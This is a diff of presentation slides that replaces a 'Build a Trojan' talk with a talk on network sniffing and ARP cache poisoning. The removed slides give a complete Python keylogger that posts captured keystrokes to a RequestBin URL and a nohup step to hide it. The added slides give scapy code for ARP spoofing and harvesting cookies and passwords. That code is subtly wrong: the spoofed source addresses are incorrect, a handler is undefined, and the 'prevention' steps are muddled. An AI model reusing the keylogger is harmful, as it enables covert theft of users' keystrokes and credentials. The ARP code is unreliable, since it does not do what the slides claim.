@@ -1,143 +1,122 @@
 class: center, middle
 
-# trojan.saurabhn.com
+# hydpy.saurabhn.com
 
 ---
 
 class: center, middle
 
-# @EXTREMOPHILARUM
+# You can find me @EXTREMOPHILARUM
 
 ---
 class: center, middle
 
-# #BuildATrojan
+# Sniffing your way through the network
 
 ---
 
 # Here's the Agenda
 
-1. History
-2. The virus
-3. Building one
+1. What?
+2. Why?
+3. How to do it?
+4. How can you be safe?
 
 ---
-# History
+# What?
 
-.center[![Trojan](https://allthatsinteresting.com/wordpress/wp-content/uploads/2021/12/still-from-troy.png)]
-
----
-class: center, middle
-# Trojan Virus
-
-.center[![Trojan](https://autodesk.blogs.com/.a/6a00d8341bfd0c53ef01b8d29a32e9970c-pi)]
+.center[![Trojan](https://www.greycampus.com/hubfs/Imported_Blog_Media/What%20is%20a%20Sniffing%20attack%20and%20How%20can%20you%20defend%20it.jpg)]
 
 ---
 class: center, middle
-# Building a Trojan
+# Why?
 
+.center[![Trojan]()]
+
+---
+# ARP packets
+- ARP packets are used to map IP addresses to MAC addresses
+- There are two types of ARP packets
+    - ARP request
+    - ARP reply
+- ARP request is used to find the MAC address of a host on the network
+- ARP reply is used to reply to the ARP request
+
+---
+# ARP cache
+- ARP cache is a table that stores the mapping of IP addresses to MAC addresses
+---
+# ARP cache poisoning
+ARP poisoning is a technique used to intercept traffic between two hosts on the network. This is done by sending fake ARP replies to the hosts. The hosts will then start sending traffic to the attacker instead of the intended host.
 ---
 class: center, middle
 
 # Prerequisites
 ```bash
-pip install pynput
+pip3 install scapy
 ```
-
 ---
-### Step 1: Lets print all keystrokes to the console
-
+# Step 1: Lets Sniff the default interface
 
 ```python
-from pynput.keyboard import Key, Listener
-
-def on_press(key):
-    print(str(key))
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+# sniff with default interface
+from scapy.all import *
+sniff(filter="port 80", prn=process_packet, store=False)
 ```
 
 ---
-### Step 2: Lets print a line to the console when a key is pressed
-
+# How to perform ARP cache poisoning
+- We will be using scapy to perform the same
+- Scapy is a python library that allows us to send and receive packets
+- We will be using the following code to perform the same
 ```python
-from pynput.keyboard import Listener
-keys = ''
-def send_keys():
-    global keys
-    print(keys)
-    keys = ''
-
-def on_press(key):
-    global keys
-    str_key = str(key)
-    if str_key == "Key.tab":
-        str_key = '\t'
-    elif str_key == "Key.enter":
-        str_key = '\n'
-    elif str_key == "Key.space":
-        str_key = ' '
-    elif str_key == "Key.backspace":
-        str_key = ' bspace '
-    elif "Key" in str_key:
-        str_key = str_key.replace("Key.", "")
-        str_key = f" {str_key} "
-    keys += str_key.strip('\'')
-    if len(keys) >= 20:
-        send_keys()
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+from scapy.all import *
+# send an ARP reply to the victim
+send(ARP(op=2, pdst="victim_ip", hwdst="victim_mac", psrc="attacker_ip"))
+# send an ARP reply to the gateway
+send(ARP(op=2, pdst="gateway_ip", hwdst="gateway_mac", psrc="attacker_ip"))
 ```
-
----
-
-### Step 3: Lets create a request bin
-
-- Open [Request bin](https://requestbin.net/)
-
-- Click **Create a RequestBin** 
----
-### Step 4: Sending data to the bin
+- The above code will send an ARP reply to the victim and the gateway
+- The victim will then start sending traffic to the attacker
+- Similarly, the gateway will also start sending traffic to the attacker
+- we can then sniff the traffic using the following code
 ```python
-from pynput.keyboard import Key, Listener
-import requests
-keys = ''
-request_bin_url = 'https://{request bin url}'
-def send_keys():
-    global keys
-    print(keys)
-    requests.post(request_bin_url, data=keys)
-    keys = ''
-def on_press(key):
-    global keys
-    str_key = str(key)
-    if str_key == "Key.tab":
-        str_key = '\t'
-    elif str_key == "Key.enter":
-        str_key = '\n'
-    elif str_key == "Key.space":
-        str_key = ' '
-    elif str_key == "Key.backspace":
-        str_key = ' bspace '
-    elif "Key" in str_key:
-        str_key = str_key.replace("Key.", "")
-        str_key = f" {str_key} "
-    keys += str_key.strip('\'')
-    if len(keys) >= 20:
-        send_keys()
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+sniff(filter="port 80", prn=process_packet, store=False)
 ```
+- The above code will sniff all the traffic on port 80
+- We can then perform operations on the traffic
+- Like, we can print the traffic to the console
+- or can extract the data from the traffic like cookies, passwords, etc
 
 ---
-### Step 5: Lets make it a bit more stealthy
-
-```bash
-nohup python3 send_line.py &
+# How to prevent ARP cache poisoning
+- We can prevent ARP cache poisoning by monitoring the ARP cache and ARP traffic on the network.
+- We can use the following code to monitor the ARP cache
+```python
+from scapy.all import *
+# sniff for ARP packets
+sniff(filter="arp", prn=process_packet, store=False)
 ```
+- The above code will sniff all the ARP packets on the network
+- We can then check if the ARP cache is poisoned or not
+- As we know, ARP cache poisoning is done by sending fake ARP replies
+- So, we can check if the ARP cache is poisoned by checking if the ARP cache has the IP address of the attacker
+- If the ARP cache has the IP address of the attacker, then the ARP cache is poisoned
+- We can then send an ARP reply to the victim and the gateway to remove the attacker from the ARP cache
+- by using the following code
+```python
+from scapy.all import *
+# send an ARP reply to the victim
+send(ARP(op=2, pdst="victim_ip", hwdst="victim_mac", psrc="gateway_ip"))
+# send an ARP reply to the gateway
+send(ARP(op=2, pdst="gateway_ip", hwdst="gateway_mac", psrc="victim_ip"))
+```
+---
+# Conclusion
+- We have seen how to perform ARP cache poisoning
+- We have also seen how to prevent ARP cache poisoning
+- We now know how to sniff traffic on the network
+- We can now perform operations on the traffic
 
 ---
 class: center, middle
